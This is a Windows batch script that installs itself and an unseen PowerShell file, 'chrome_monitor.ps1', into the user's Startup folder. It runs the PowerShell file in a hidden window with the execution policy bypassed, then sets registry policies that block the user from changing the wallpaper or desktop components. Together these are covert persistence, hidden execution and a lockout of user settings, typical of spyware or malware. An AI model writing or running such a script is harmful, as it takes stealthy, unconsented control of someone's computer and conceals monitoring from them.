@echo off
setlocal

set SCRIPT_PATH=%~dp0chrome_monitor.ps1

:: Add to startup
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy "%~f0" "%STARTUP_FOLDER%\chrome_monitor.bat" >nul
copy "%SCRIPT_PATH%" "%STARTUP_FOLDER%\chrome_monitor.ps1" >nul

:: Run PowerShell script in background
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT_PATH%"

:: Disable changing wallpaper via Group Policy
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoChangingWallPaper /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoComponents /t REG_DWORD /d 1 /f

:: Optional: Force a group policy update
gpupdate /force

exit
